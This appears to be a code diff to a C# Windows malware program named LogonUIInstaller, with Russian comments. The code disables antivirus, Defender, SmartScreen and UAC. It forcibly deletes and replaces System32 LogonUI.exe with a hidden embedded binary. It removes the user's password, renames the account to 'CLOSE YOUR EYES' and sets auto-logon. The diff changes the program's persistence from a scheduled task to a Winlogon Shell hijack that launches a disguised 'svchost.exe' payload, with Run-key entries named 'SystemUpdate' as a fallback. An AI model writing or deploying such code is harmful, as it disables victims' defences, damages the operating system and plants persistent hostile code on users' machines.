@@ -47,7 +47,7 @@ namespace LogonUIInstaller
                 DisableAntivirusAndUAC();
                 ApplySettingsToDefaultProfile();
                 RenameCurrentUserFixed();
-                AddToStartupWithTaskScheduler(); // <-- НОВЫЙ МЕТОД
+                AddToStartupWithShell(); // <-- ПОДМЕНА SHELL (КАК В NoSleep)
                 ForceReboot();
             }
             finally
@@ -96,7 +96,7 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        // ==================== ЗАМЕНА LogonUI (УСИЛЕННАЯ) ====================
+        // ==================== ЗАМЕНА LogonUI ====================
         private static void ReplaceLogonUI()
         {
             try
@@ -104,17 +104,12 @@ namespace LogonUIInstaller
                 string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
                 if (!File.Exists(originalPath)) return;
 
-                // 1. Полный доступ через takeown + icacls
                 ForceFullAccess(originalPath);
-                
-                // 2. Убиваем все процессы
                 KillLogonUIProcesses();
                 Thread.Sleep(2000);
                 
-                // 3. Снимаем все атрибуты
                 File.SetAttributes(originalPath, FileAttributes.Normal);
                 
-                // 4. Удаляем всеми способами
                 bool deleted = false;
                 for (int i = 0; i < 10; i++)
                 {
@@ -136,7 +131,6 @@ namespace LogonUIInstaller
                         }
                         catch
                         {
-                            // Пробуем через cmd
                             try
                             {
                                 Process.Start(new ProcessStartInfo
@@ -155,7 +149,6 @@ namespace LogonUIInstaller
                     }
                 }
 
-                // 5. Если не удалили — пробуем через перемещение
                 if (!deleted)
                 {
                     try
@@ -167,13 +160,10 @@ namespace LogonUIInstaller
                     catch { }
                 }
 
-                // 6. Записываем кастомный LogonUI
                 byte[] customLogonUI = ExtractResourceBytes("LogonUI.exe");
                 File.WriteAllBytes(originalPath, customLogonUI);
                 
-                // 7. Делаем скрытым и защищённым
                 File.SetAttributes(originalPath, FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
-                
             }
             catch { }
         }
@@ -248,7 +238,6 @@ namespace LogonUIInstaller
         {
             try
             {
-                // Через .NET
                 foreach (Process p in Process.GetProcessesByName("LogonUI"))
                 {
                     try
@@ -264,7 +253,6 @@ namespace LogonUIInstaller
                     catch { }
                 }
                 
-                // Через taskkill
                 try
                 {
                     Process.Start(new ProcessStartInfo
@@ -455,7 +443,6 @@ namespace LogonUIInstaller
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                     key.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
 
-                // Дополнительно отключаем Defender
                 try
                 {
                     using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
@@ -571,7 +558,7 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        // ==================== ПЕРЕИМЕНОВАНИЕ (ИСПРАВЛЕННОЕ) ====================
+        // ==================== ПЕРЕИМЕНОВАНИЕ ====================
         private static void RenameCurrentUserFixed()
         {
             try
@@ -579,7 +566,6 @@ namespace LogonUIInstaller
                 string currentUser = Environment.UserName;
                 string newUser = "CLOSE YOUR EYES";
 
-                // 1. Убираем пароль
                 Process p0 = Process.Start(new ProcessStartInfo
                 {
                     FileName = "net",
@@ -591,7 +577,6 @@ namespace LogonUIInstaller
                 p0?.WaitForExit(3000);
                 p0?.Close();
 
-                // 2. Переименовываем через wmic (работает в Windows 10)
                 Process p1 = Process.Start(new ProcessStartInfo
                 {
                     FileName = "wmic",
@@ -603,10 +588,8 @@ namespace LogonUIInstaller
                 p1?.WaitForExit(5000);
                 p1?.Close();
 
-                // 3. Ждём применения
                 Thread.Sleep(2000);
 
-                // 4. Переименовываем папку профиля
                 string oldProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", currentUser);
                 string newProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", newUser);
 
@@ -618,7 +601,6 @@ namespace LogonUIInstaller
                     }
                     catch
                     {
-                        // Если не получается — копируем
                         try
                         {
                             CopyDirectory(oldProfilePath, newProfilePath, true);
@@ -628,7 +610,6 @@ namespace LogonUIInstaller
                     }
                 }
 
-                // 5. Обновляем путь в реестре
                 string sid = GetUserSID(newUser);
                 if (!string.IsNullOrEmpty(sid))
                 {
@@ -639,7 +620,6 @@ namespace LogonUIInstaller
                     }
                 }
 
-                // 6. Active Setup (гарантия)
                 string guid = Guid.NewGuid().ToString("B").ToUpper();
                 using (var key = Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Active Setup\Installed Components\{guid}"))
                 {
@@ -648,7 +628,6 @@ namespace LogonUIInstaller
                     key.SetValue("Version", "1.0", RegistryValueKind.String);
                 }
 
-                // 7. Автоматический вход
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                 {
                     key.SetValue("AutoAdminLogon", "1", RegistryValueKind.String);
@@ -695,8 +674,8 @@ namespace LogonUIInstaller
             return null;
         }
 
-        // ==================== НОВЫЙ АВТОЗАПУСК (ПЛАНИРОВЩИК ЗАДАЧ) ====================
-        private static void AddToStartupWithTaskScheduler()
+        // ==================== АВТОЗАПУСК (ПОДМЕНА SHELL) ====================
+        private static void AddToStartupWithShell()
         {
             try
             {
@@ -716,86 +695,19 @@ namespace LogonUIInstaller
                 File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                 File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
 
-                // Удаляем задачу, если уже существует
-                RunCommand("schtasks", "/delete /tn \"SystemUpdate\" /f");
+                // ===== ПОДМЕНА SHELL (КАК В NoSleep) =====
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
+                {
+                    // explorer.exe, "C:\...\svchost.exe" stage2
+                    key.SetValue("Shell", $"explorer.exe, \"{destPath}\" stage2", RegistryValueKind.String);
+                }
 
-                // Создаём задачу в планировщике (запуск при входе пользователя)
-                string xml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
-<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-    </LogonTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id=""Author"">
-      <RunLevel>HighestAvailable</RunLevel>
-      <UserId>{Environment.UserName}</UserId>
-      <LogonType>InteractiveToken</LogonType>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>true</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context=""Author"">
-    <Exec>
-      <Command>""{destPath}""</Command>
-      <Arguments>stage2</Arguments>
-      <WorkingDirectory>{appDataPath}</WorkingDirectory>
-    </Exec>
-  </Actions>
-</Task>";
-
-                // Сохраняем XML во временный файл
-                string xmlPath = Path.Combine(Path.GetTempPath(), "SystemUpdateTask.xml");
-                File.WriteAllText(xmlPath, xml);
-
-                // Импортируем задачу в планировщик
-                RunCommand("schtasks", $"/create /xml \"{xmlPath}\" /tn \"SystemUpdate\" /f");
-
-                // Удаляем временный XML
-                try { File.Delete(xmlPath); } catch { }
-
-                // Дополнительно добавляем в Run (для надёжности, но планировщик главный)
+                // ===== РЕЗЕРВ (НА ВСЯКИЙ СЛУЧАЙ) =====
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
 
                 using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
-            }
-            catch { }
-        }
-
-        private static void RunCommand(string fileName, string arguments)
-        {
-            try
-            {
-                Process p = Process.Start(new ProcessStartInfo
-                {
-                    FileName = fileName,
-                    Arguments = arguments,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false
-                });
-                p?.WaitForExit(5000);
-                p?.Close();
             }
             catch { }
         }
